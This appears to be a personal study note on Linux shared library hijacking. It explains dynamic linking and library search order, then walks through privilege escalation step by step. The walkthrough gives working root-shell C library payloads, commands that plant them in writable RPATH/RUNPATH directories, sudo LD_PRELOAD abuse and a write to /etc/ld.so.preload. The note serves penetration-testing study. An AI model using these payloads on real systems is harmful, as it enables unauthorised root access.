---
created: 14-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---


## Dynamic linking
### Static and dynamic libraries

Linux programs rarely contain all their code within a single executable file. Instead, they rely on **shared object libraries (`.so` files)** that are loaded dynamically at runtime. This saves memory and disk space, but at the same time creates an **attack surface**:

> If you can control **which shared library** a privileged binary loads, or **where the loader looks for it**, you can execute arbitrary code with that binary’s privileges. This is called **shared library hijacking**.

But let's take one step back. 

There are two types of libraries in Linux:
- **Static libraries (`.a`)**
- **Dynamic libraries (`.so`)**, also known as **shared libraries**
### Static libraries

>A **static library (`.a`)** is a collection of object files (`.o`) that are linked into the program during compile time. 

- The linker copies **all referenced code from libraries directly into the executable** at compile time. That's why a statically-linked executable is typically much larger than a dynamically-linked one.
- A statically-linked binary is **self-contained** — it doesn't need the library file to exist at runtime.
- **Execution is slightly faster** because there's no overhead for loading libraries at runtime compared to dynamically-linked binaries.
- Updates to the library require **recompiling every statically-linked binary** that uses it.
- **Memory usage is higher system-wide** since library code can't be shared between processes.

Statically-linked binaries are rarely used, but you can still see them in:
- **Critical system recovery** tools that must work even when shared libraries are corrupted.
- Distribution of **proprietary software** — to avoid dependency hell.
- Embedded systems that prioritize predictability over space efficiency.

### Dynamic libraries

>A **dynamic library (`.so`, shared object)** is a collection of functions and procedures that are loaded into the program at runtime by the dynamic linker.

- Dynamically-linked executables contain *references* to library functions, not the actual code. They don't embed library code, so they're usually much smaller than statically-linked ones.
- **Libraries can be updated independently** without recompiling programs.
- The dynamic library must be distributed alongside the executable or be available at a location known to the system.
- Multiple programs can share the same library in memory — a single copy of `libc.so.6` serves hundreds of processes.
- There's a small performance overhead during program startup for symbol resolution (assigning proper addresses to all external entities the binary refers to).
 
The most common example of a shared library is `libc.so.6` — the GNU C Library that nearly every program uses.

- To check if a binary is statically or dynamically linked, use the [`file`](https://man.archlinux.org/man/file.1.en) command:

```bash
file /bin/ls
```

>[!example]+
> 
> ```bash
> file /bin/ls
> ```
> ```bash
> /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ae08cb2accf453963810f4a44ae44e71c459cd12, for GNU/Linux 4.4.0, stripped
> ```
> - The output for a dynamically-linked binary would contain `dynamically linked`, and `statically-linked` for a statically-linked binary.

### The ELF format and the `.dynamic` section

Dynamically-linked binaries in Linux use the [ELF (Executable and Linkable Format)](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format). Within an ELF file, the `.dynamic` section contains a set of structures that tell the dynamic linker how to prepare the program for execution. 

- You can inspect the `.dynamic` section of an ELF file using [`readelf`](https://man.archlinux.org/man/readelf.1.en):

```bash
readelf -d /bin/ls
```

>[!example]+ 
> ```bash
> readelf -d /bin/ls
> ```
> 
> ```bash
> Dynamic section at offset 0x25a58 contains 26 entries:
>   Tag        Type                         Name/Value
>  0x0000000000000001 (NEEDED)             Shared library: [libcap.so.2]
>  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
>  0x000000000000000c (INIT)               0x3000
>  0x000000000000000d (FINI)               0x1b0c4
>  # ...
> ```

- Key tags of a `.dynamic` section:

| Tag                          | Meaning                                                                                                                                               |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `DT_NEEDED`                  | Name of a required shared object (e.g., `libc.so.6`); may be used multiple times.                                                                     |
| `DT_RPATH`                   | **Deprecated**; hard‑coded search path (checked **before** the paths listed in the `LD_LIBRARY_PATH` environment variable). Found in legacy binaries. |
| `DT_RUNPATH`                 | Modern replacement for `RPATH` (checked **after** `LD_LIBRARY_PATH`).                                                                                 |
| `DT_INIT`/`DT_INIT_ARRAY`    | Address of constructor(s) run **before** `main()`.                                                                                                    |
| `DT_FINI`/`DT_FINI_ARRAY`    | Address of destructor(s) run **after** `main()` returns.                                                                                              |
| `DT_SONAME`                  | The _canonical_ name of the library itself (used for versioning).                                                                                     |
| `DT_FLAGS`                   | Flags such as `DF_BIND_NOW` (eager binding).                                                                                                          |
| `DT_VERNEED`/`DT_VERNEEDNUM` | Version requirements of needed libraries.                                                                                                             |

>[!note]- [`readelf`](https://man.archlinux.org/man/readelf.1.en) option cheatsheet
>
> 
> | Option                    | Description                                         |
> | ------------------------- | --------------------------------------------------- |
> | `-a`, `--all`             | Equivalent to: `-h -l -S -s -r -d -V -A -I`         |
> | `-h`, `--file-header`     | Display the ELF file header.                        |
> | `-l`, `--program-headers` | Display the program headers.                        |
> | `-S`, `--section-headers` | Display the sections' header.                       |
> | `-s`, `--syms`            | Display the symbol table.                           |
> | `-r`, `--relocs`          | Display the relocations (if present).               |
> | `-d`, `--dynamic`         | Display the dynamic section (if present).           |
> | `-V`, `--version-info`    | Display the version sections (if present).          |
> | `-A`,  `--arch-specific`  | Display architecture specific information (if any). |
> | `-I`, `--histogram`       | Display histogram of bucket list lengths.           |

### The dynamic linking process

When a dynamically linked executable starts, the kernel hands control to the dynamic linker (`ld-linux.so`), which searches for and loads all shared libraries the binary needs.

>[!note] The `ld.so` configuration file is located at `/etc/ld.so.conf`.

The dynamic linking process consists of several steps:

1. **Kernel loads the program and dynamic linker**
	- The kernel reads the ELF header and finds the `INTERP` section, which specifies which dynamic linker to use (usually `/lib64/ld-linux-x86-64.so.2` on 64-bit systems). 
	- The kernel loads both the program and the dynamic linker into memory, then transfers control to the dynamic linker. 

>[!example]+
> - View the dynamic linker the program specifies:
> 
> ```bash
> readelf -l /bin/ls | grep interpreter 
> ```
> ```bash
>   [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
> ```

2. **Dependency resolution**
	- The dynamic linker (`ld.so`) parses the `.dynamic` section of the executable to identify all `DT_NEEDED` entries — the list of required libraries.

>[!example]+
> - View the list of libraries the binary requires:
> 
> ```bash
> readelf -d /bin/ls | grep NEEDED
> ```
> ```bash
>  0x0000000000000001 (NEEDED)             Shared library: [libcap.so.2]
>  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
> ```

3. **Library search**
	- For each required library, the linker searches directories in a specific order:
		- `RPATH` (Runtime Path)
		- `LD_LIBRARY_PATH`
		- `RUNPATH`
		- `/etc/ld.so.cache` (system-wide cache) and `/etc/ld.so.conf`/`/etc/ld.so.conf.d/*`
		- Default system directories

>[!note] See the [[#Library search order]] section for more.

4. **Library loading**
	- Once found, the linker uses `mmap()` to map each library into the process's address space. 
	- Libraries are **position-independent code (PIC)** and can be loaded at any address.

5. **Symbol resolution**
	- The program references functions like `printf()` or `malloc()` by name. The linker resolves these symbols by looking them up in the loaded libraries' symbol tables and updating the program's Global Offset Table (GOT) and Procedure Linkage Table (PLT) with actual addresses.

>[!example]+
> - List symbols from object files using [`nm`](https://man.archlinux.org/man/nm.1):
> 
> ```bash
> nm -D /bin/ls | grep printf
> ```
> ```bash
>  U __fprintf_chk@GLIBC_2.3.4
>  U __printf_chk@GLIBC_2.3.4
>  U snprintf@GLIBC_2.2.5
>  U __snprintf_chk@GLIBC_2.3.4
>  U __sprintf_chk@GLIBC_2.3.4
>  U __vfprintf_chk@GLIBC_2.3.4
> ```
>>[!note] The `U` means "undefined" — it expects to find `printf` in a loaded library.

6. **Relocation**
	- The linker adjusts any position-dependent code or data references within the libraries to work at their loaded addresses.

7. **Initialization**
	- The linker calls initialization functions specified by `DT_INIT`, `DT_INIT_ARRAY`, or the special `_init()` function in libraries. 
	- **This code runs before `main()`**. This is why constructor functions in malicious libraries are so effective.

8. **Transfer control**
	 - Finally, the dynamic linker jumps to the program's entry point (usually `_start`, which eventually calls `main()`).
### Library search order

#### 1. `RPATH`

>**`RPATH` (Runtime Search Path)** is a runtime search path hard-coded into the binary during compilation. It has the highest priority in the search order.

- `RPATH` can be set during compilation using the `-rpath` option:

```bash
gcc -Wl,-rpath,/path/to/libraries -o app app.c
```

- View `RPATH` (if set):

```bash
readelf -d /path/to/binary | grep RPATH
```
```bash
objdump -x /path/to/binary | grep RPATH
```

>[!note] `RPATH` can be set using 
>The `LD_RUN_PATH` environment variable sets `RPATH` (sometimes `RUNPATH`) of a binary **at linking time** (not execution).
>```bash
>export LD_RUN_PATH=/opt/custom_libraries/
>gcc main.c -lcustom_library -o binary
>```
#### 2. `LD_LIBRARY_PATH`

>**`LD_LIBRARY_PATH`** is an environment variable that prepends directories to the library search path.

```bash
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH && /path/to/binary
```
 
- `LD_LIBRARY_PATH` is automatically ignored for SUID/SGID binaries by modern `ld.so` for security reasons (to prevent privilege escalation through library hijacking).

#### 3. `RUNPATH`

>`RUNPATH` is similar to `RPATH` but with lower priority — it's checked _after_ `LD_LIBRARY_PATH`. It was introduced to give users more control via environment variables while still allowing developers to specify fallback library paths.

- `RUNPATH` is slightly less dangerous than `RPATH` because `LD_LIBRARY_PATH` takes precedence, but it's still exploitable if it points to writable directories.

- `RUNPATH` is set with:

```bash
gcc -Wl,--enable-new-dtags -Wl,-rpath,/path/to/libraries -o app app.c
```

>[!note] The `--enable-new-dtags` flag tells the linker to use `RUNPATH` instead of `RPATH`. `DT_RPATH` is ignored if `DT_RUNPATH` is set.

- View `RUNPATH`:

```bash
readelf -d /path/to/binary | grep RUNPATH
```

>[!example]+
> ```bash
> readelf -d /usr/bin/xxd | grep RUNPATH
> ```
> 
> ```bash
>  0x000000000000001d (RUNPATH)            Library runpath: [/usr/lib/perl5/5.42/core_perl/CORE]
> ```


>[!note] See an excellent demonstration of how `RPATH`, `LD_LIBRARY_PATH`, and `RUNPATH` can be used to set paths to libraries for executables: [`rpath vs. runpath — Heart Bleed, Medium`](https://medium.com/obscure-system/rpath-vs-runpath-883029b17c45).
##### 4. `/etc/ld.so.cache`

>`/etc/ld.so.cache` is a binary cache file generated by [`ldconfig`](https://man.archlinux.org/man/ldconfig.8.en) that maps library names to their full paths. It dramatically speeds up library resolution during execution.

- The cache is built from directories listed in `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*.conf` — system-wide dynamic linker configuration files.

- View current cache:

```bash
ldconfig -p | head
```

>[!example]+
> ```bash
> ldconfig -p | head
> ```
> 
> ```bash
> 2179 libs found in cache `/etc/ld.so.cache'
> 	libzstd.so.1 (libc6,x86-64) => /usr/lib/libzstd.so.1
> 	libzstd.so (libc6,x86-64) => /usr/lib/libzstd.so
> 	libzmq.so.5 (libc6,x86-64) => /usr/lib/libzmq.so.5
> 	libzmq.so (libc6,x86-64) => /usr/lib/libzmq.so
> 	libzix-0.so.0 (libc6,x86-64) => /usr/lib/libzix-0.so.0
> 	libzix-0.so (libc6,x86-64) => /usr/lib/libzix-0.so
> 	libzip.so.5 (libc6,x86-64) => /usr/lib/libzip.so.5
> 	libzip.so (libc6,x86-64) => /usr/lib/libzip.so
> 	libzimg.so.2 (libc6,x86-64) => /usr/lib/libzimg.so.2
> ```


#### 5. Default system directories

- Finally, if all else fails, the linker searches standard system directories:
	- `/lib`
	- `/lib64`
	- `/usr/lib`
	- `/usr/lib64`

These directories typically require root access to modify, so they're resistant to library hijacking attacks.
#### Special cases: `$ORIGIN`, `LD_PRELOAD`, and `/etc/ld.so.preload`

##### `$ORIGIN`

>The special variable `$ORIGIN` in `RPATH` or `RUNPATH` expands to the **directory where the executable resides** at runtime. This allows binaries to search for libraries in paths relative to the binary location, rather than using absolute paths. This is essential for self-contained applications that can be installed in arbitrary directories without requiring system-wide dependencies. 

```bash
readelf -d /path/to/binary | grep RPATH
```

This also means that if you can copy the binary to a location you control, you might be able to control which libraries are loaded.
##### `LD_PRELOAD`

>**`LD_PRELOAD`** is an environment variable that lists libraries to load _before_ all others (including `libc`). It's similar to `LD_LIBRARY_PATH`, but points to specific libraries, not directories where libraries reside.

```bash
LD_PRELOAD=/tmp/custom_library.so /path/to/binary
```

- When a function is called, the linker searches loaded libraries in order. Since `LD_PRELOAD` libraries are loaded first, their symbols override later definitions. You can replace `malloc()`, `fopen()`, or any other function.

##### `/etc/ld.so.preload`

>The `/etc/ld.so.preload` file lists libraries to be preloaded for _every_ dynamically-linked program on the system. It's the persistent equivalent of `LD_PRELOAD`.

```bash
cat /etc/ld.so.preload
```
## SUID/SGID barrier: the secure-execution mode

>**Shared library injection via `LD_PRELOAD` and `LD_LIBRARY_PATH` usually fails against SUID/SGID binaries.**

- When a SUID or SGID binary is executed, the kernel enables **secure-execution mode**. It sets the `AT_SECURE` flag (in the auxiliary vector passed to the process) to `1`.
- The dynamic linker (`ld.so`) detects this flag and sanitizes the environment. Specifically, it ignores dangerous variables like `LD_PRELOAD` and `LD_LIBRARY_PATH` to prevent library hijacking attacks. 

So, shared library hijacking via `LD_PRELOAD` or `LD_LIBRARY_PATH` is generally only effective if the binary is **not** SUID/SGID but runs with elevated privileges via other means (e.g., privileged Cron job, `sudo`, or capabilities) assuming that the variables are preserved or misconfigured.

But this doesn't mean you should exclude SUID/SGID binaries from enumeration entirely. Library hijacking might still be possible via other methods.

>[!note] See [[SUID_&_SGID_privilege_escalation#Environment variables and secure-execution mode]].
## Enumeration

- Search for SUID and SGID binaries:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

```bash
find / -type f -perm -2000 -ls 2>/dev/null
```

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
```

>[!note] See [[SUID_&_SGID_privilege_escalation]].

- Check if `sudo` preserves `LD_PRELOAD` or `LD_LIBRARY_PATH`:

```bash
sudo -l
```

Look for `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH`.

>[!note] See [[sudo_privilege_escalation]].

- Check for processes running as root or other privileged users:

```bash
ps aux | grep root
```

- For each interesting executable, check for `RPATH`/`RUNPATH`:

```bash
readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH'
```

- To check multiple binaries from your SUID list:

```bash
while read line; do binary=$(echo "$line" | awk '{print $NF}'); echo "Checking: $binary"; readelf -d "$binary" 2>/dev/null | grep -E 'RPATH|RUNPATH'; done < /tmp/suid_sgid.txt
```

You're looking for `RPATH`/`RUNPATH` that:
- Points to non-standard directories (anything outside `/lib`, `/usr/lib`).
- Points to world-writable directories (`/tmp`, `/var/tmp`, `/dev/shm`).
- Points to directories you have write access to.
- Contains relative paths or paths with `$ORIGIN`.

>[!example]+
> ```bash
> readelf -d /usr/local/bin/vulnerable_app | grep RPATH
> ```
> 
> ```bash
>  0x000000000000000f (RPATH)              Library rpath: [/tmp/libs]
> ```
> 
> - If `/tmp/libs` is writable by you, this is immediately exploitable.

- Check library dependencies (libraries it needs):

```bash
ldd /path/to/binary
```

- More detailed dependency information:

```bash
ldd -v /path/to/binary
```

- Using [`objdump`](https://man.archlinux.org/man/objdump.1):

```bash
objdump -p /path/to/binary | grep NEEDED
```

- Use `strace` to watch what libraries are actually loaded during execution (runtime binary analysis):

```bash
strace -e open,openat,access /path/to/binary 2>$1 | grep ".so" 
```

```bash
strace -f -e trace=open,openat,access,execve /path/to/binary 2>&1 | grep -E "\.so|ENOENT"
```

```bash
strace -f -ff -o /tmp/trace /path/to/binary
```

```bash
grep "\.so" /tmp/trace.*
```

- What to note:
	- Libraries that are marked as not found (this indicates missing dependencies you may be able to create).
	- Custom libraries (anything not in standard system directories).
	- The order in which libraries are resolved (earliest libraries can intercept calls to later ones).

>[!note] The `ENOENT` (Error NO ENTry) in `strace` output indicates files that don't exist.

>[!tip]+
>If the program tries to load a library from a directory that doesn't exist and if you can create that directory and write to it, you can place a malicious library there.

- Check `ld.so` configuration:

```bash
cat /etc/ld.so.conf
```

```bash
ls -la /etc/ld.so.conf.d/
```

```bash
cat /etc/ld.so.conf.d/*
```

- View the linker cache:

```bash
ldconfig -p | less
```

## Exploitation

Common ways to achieve privilege escalation via library hijacking include:
- `RPATH` injection
- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- A binary loads a non-existing library 
- Relative `RPATH` and `$ORIGIN` exploitation
- Library injection via `/etc/ld.so.preload`

Your targets include:
- SUID/SGID binaries
- Binaries with capabilities
- **System services** started by `systemd` that run as `root` or other privileged users.

### `RPATH` injection

If a SUID binary has an `RPATH` pointing to a directory you have write access to, you can place a malicious library there.

- Suppose you've found a SUID binary at `/usr/local/bin/suid_binary` with this `RPATH`:

```bash
readelf -d /usr/local/bin/suid_binary | grep RPATH
```
```bash
 0x000000000000000f (RPATH) Library rpath: [/opt/libs]
```

- Your user can write to `/opt/libs`, which means you might be able to hijack one of the libraries. You use `ldd` to trace which libraries the binary is looking for:

```bash
ldd /usr/local/bin/suid_binary
```
```bash
   linux-vdso.so.1 (0x00007fff5e9f0000) 
   libhelper.so => /opt/libs/libhelper.so (0x00007f9e4c1a0000) 
   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9e4bfa0000)
```

- The binary uses `libhelper.so` from the writable `/opt/libs`. You then create a C file with a constructor that spawns a root shell:

```C
// some_lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// constructor function - executes when library is loaded
__attribute__((constructor))
void init() {
    
    // remove effective UID restrictions
    setuid(0);
    setgid(0);
    
    // spawn a shell
    system("/bin/bash -p");
}

// you might need to implement functions that the original library had to prevent the program from crashing:
void some_function() {
    // dummy implementation
}
```

- Compile the library with the name the target binary references:

```bash
gcc -shared -fPIC -o /opt/libs/libhelper.so some_lib.c
```

- Verify it's a proper shared object:

```bash
file /opt/libs/libhelper.so
```

- Execute the SUID binary and get root:

```bash
/usr/local/bin/suid_binary
```

Since `RPATH` takes precedence over `LD_LIBRARY_PATH`, the dynamic linker will load your library first and execute the constructor function that creates a root shell. 

>[!tip]+ Exported functions
> If the original library exports specific functions that the binary calls, you need to define these functions in your library (even as stubs) to prevent errors:
> - Find out what functions the original library exports:
> ```bash
> nm -D /opt/libs/libhelper.so.backup | grep " T "
> ```
> 
>- Implement those functions in your library:
> 
> ```c
> // enhanced malicious_lib.c
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
> 
> __attribute__((constructor))
> void init() {
>     setuid(0);
>     setgid(0);
>     system("/bin/bash -p");
> }
> 
> // stub implementations of original functions
> int authenticate_user(const char *username, const char *password) {
>     return 1; // Always succeed
> }
> 
> void log_action(const char *action) {
>     // do nothing
> }
> 
> void cleanup() {
>     // do nothing
> }
> ```

#### Writable `RUNPATH` 

1. Suppose you find a custom SUID binary:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```
```bash
    55422     20 -rwsr-xr-x   1 root     root        16728 Sep  1  2020 /home/mrb3n/payroll
# ...
```

2. You inspect it and see that `RUNPATH` refers to a non-standard library location, `/development`:

```bash
readelf -d /home/mrb3n/payroll
```
```bash
Dynamic section at offset 0x2da0 contains 29 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libshared.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
# ...
```

3. You have write access to it:

```bash
ls -ld /development
```
```bash
drwxrwxrwx 2 root root 4096 Sep  1  2020 /development
```

4. There, you find `libshared.so` that the dynamic linker needs (`NEEDED` in the output of `readelf`):

```bash
ls -l /development
```
```bash
total 12
-rwxrwxr-x 1 mrb3n mrb3n 8224 Sep  1  2020 libshared.so
```

5. You check what libraries the binary loads during execution:

```bash
strace -e open,openat,access /home/mrb3n/payroll 2>&1 | grep ".so" 
```
```bash
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/tls/x86_64/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/tls/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/tls/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/tls/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/x86_64/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/development/libshared.so", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/development/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
```

```bash
ldd /home/mrb3n/payroll
```
```bash
	linux-vdso.so.1 (0x00007ffe72335000)
	libshared.so => /development/tls/x86_64/x86_64/libshared.so (0x00007fc4b5ffe000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc4b5c0d000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc4b6200000)
```

6. Notice the binary tries to load libraries from `/development/tls/x86_64/x86_64/`, but this fails with an error, since there are no such directories in `/development` (`-1 ENOENT`). Since you can write to `/development`, you create the respective subdirectories there:

```bash
mkdir -p /development/tls/x86_64/x86_64/
```

7. Create a C program with a constructor that runs a root shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

```

8. Compile the code into the created target directory with the same name what the the binary is looking for (e.g., `libshared.so`):

```bash
gcc -fPIC -shared -nostartfiles -o /development/tls/x86_64/x86_64/libshared.so /tmp/shell.c
```

9. Execute the vulnerable binary:

```bash
/home/mrb3n/payroll
```

10. An error occurs:

```bash
/home/mrb3n/payroll
/home/mrb3n/payroll: symbol lookup error: /home/mrb3n/payroll: undefined symbol: dbquery
```

11. The binary expects the library to export a specific function named `dbquery`. It's not defined in the library you created, so you append a stub function definition to `/tmp/shell.c` and recompile the library:

```c
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

```bash
gcc -fPIC -shared -nostartfiles -o /development/tls/x86_64/x86_64/libshared.so /tmp/shell.c
```

12. Execute again and get root access:

```bash
/home/mrb3n/payroll
```
```bash
root@NIX02:~# whoami
root
root@NIX02:~# 
```

### `LD_PRELOAD`

>**`LD_PRELOAD`** is an environment variable that specifies shared libraries (`.so` files) to be loaded **before** any other shared libraries when the program starts. 

If you can control the value of the `LD_PRELOAD` variable used by a privileged process, you can hijack a legitimate library and inject code that escalates your privileges. With `sudo` binaries, it's possible that `sudo` specifies `LD_PRELOAD` in `env_keep`.

1. Suppose you check your `sudo` privileges and see:

```bash
sudo -l
```
```bash
Matching Defaults entries for user on target:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User user may run the following commands on target:
    (root) NOPASSWD: /usr/bin/apache2
```

`env_keep+=LD_PRELOAD` means that `LD_PRELOAD` is preserved from your user environment to `sudo`.

2. You write code that spawns a root shell:

```C
// /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash -p");
}
```

>[!note] The `_init()` function is called when the library loads.

3. Compile it as a shared library and place it into a directory you control:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
```

4. Then execute the vulnerable binary with `sudo` and `LD_PRELOAD` set to your library path:

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/apache2
```

```bash
root@NIX02:~# whoami
root
root@NIX02:~# cat  /root/ld_preload/flag.txt
6a9c151a599135618b8f09adc78ab5f1
```

`/tmp/shell.so` is the first library the binary loads, so the `_init()` function is executed immediately upon load and spawns a root shell.

### `LD_LIBRARY_PATH`

>**`LD_LIBRARY_PATH`** is an environment variable that prepends directories to the library search path.

Similar to `LD_PRELOAD`, if you control the `LD_LIBRARY_PATH` environment variable for a binary you can execute with `sudo` privileges, then you can preload libraries from directories you control before any other libraries.
### A binary loads a non-existing library 

When a program searches for a library in multiple locations and fails to find it in early paths, and you control one of the directories it searches (such as through `LD_LIBRARY_PATH`, `RUNPATH`, etc.), you can hijack the library by creating your own library with the same name in the directory you control.

- Suppose you find that a binary you can execute with `sudo` tries to load a non-existing library:

```bash
strace -e open /usr/local/bin/app 2>&1 | grep custom.so
```

```bash
open("/home/user/.local/lib/custom.so", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/usr/lib/custom.so", O_RDONLY) = 3
```

The program first tries to load from `/home/user/.local/lib/` (which doesn't exist) before finding it in `/usr/lib/`. You have write access to `/home/user/.local`.

- You create the directory where the binary tries to find the library:

```bash
mkdir -p /home/user/.local/lib
```

- Then write C code with a constructor that spawns a root shell:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

- Then compile it as a shared library:

```bash
gcc -shared -fPIC -o /home/user/.local/lib/custom.so shell.c
```

- Execute the binary:

```bash
sudo /usr/local/bin/app
```

Now, if you trace `open()` system calls, you'll see `custom.so` in `/home/user/.local/lib/` is loaded first, which spawns a root shell.

```bash
strace -e open /usr/local/bin/app 2>&1 | grep custom.so
```
```bash
open("/home/user/.local/lib/custom.so", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/usr/lib/custom.so", O_RDONLY) = 3
```

The program first tries to load from `/home/user/.local/lib/` (which doesn't exist) before finding it in `/usr/lib/`. You have write access to `/home/user/.local`.

### Relative `RPATH` and `$ORIGIN` exploitation

- Some binaries have `RPATH` set with relative paths or using `$ORIGIN`:

```bash
readelf -d /opt/app/bin/service | grep RPATH
```
```bash
 0x000000000000000f (RPATH)              Library rpath: [$ORIGIN/../lib]
```

- `$ORIGIN` is a special variable used in the `RPATH` field that resolves to the directory containing the executable at runtime (e.g., `/opt/app/lib`).

**Option 1: If you can write to the location specified in `RPATH`:**

1. Since `$ORIGIN` resolves to the directory where the binary resides, you create a library in `/opt/app/lib` (`/opt/app/bin/../lib` -> `/opt/app/lib`):

```bash
gcc -shared -fPIC -o /opt/app/lib/libname.so shell.c
```

2. Then execute the binary:

```bash
/opt/app/bin/service
```

**Option 2: If you can't write there but can copy the executable to a directory you control:**

1. Copy the binary to your directory:

```bash
cp -p /opt/app/bin/service /tmp/privesc_app/
```

>[!note] `-p` preserves file mode, ownership, and timestamps when copying. 

2. Create a relative library path:

```bash
mkdir -p /tmp/privesc_app/lib
```

3. Place the library in that location:

```bash
gcc -shared -fPIC -o /tmp/privesc_app/lib/libname.so shell.c
```

4. Execute:

```bash
/tmp/privesc_app/service
```

### Library injection via `/etc/ld.so.preload`

If you can write to `/etc/ld.so.preload` or create it (very rare but possible with certain misconfigurations), you can inject a library that will be loaded by every dynamically linked program:

1. Check permissions:

```bash
ls -la /etc/ld.so.preload
```

2. Add your library:

```bash
echo "/tmp/evil.so" > /etc/ld.so.preload
```

## References and further reading

- [`Static Library vs. Dynamic Library: Understanding the Differences — Abhishek Jain, Medium`](https://medium.com/@abhishekjainindore24/static-library-vs-dynamic-library-understanding-the-differences-26e47cac93b6)
- [`rpath — Wikipedia`](https://en.wikipedia.org/wiki/Rpath)
- [`rpath vs. runpath — Heart Bleed, Medium`](https://medium.com/obscure-system/rpath-vs-runpath-883029b17c45)
- [`ldconfig — man pages`](https://man.archlinux.org/man/ldconfig.8.en)

- [`Linux Privilege Escalation using LD_Preload — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)


---

- [`Leveraging LD_AUDIT to Beat the Traditional Linux Library Preloading Technique`](https://www.sentinelone.com/labs/leveraging-ld_audit-to-beat-the-traditional-linux-library-preloading-technique/) — TDB `LD_AUTDIT`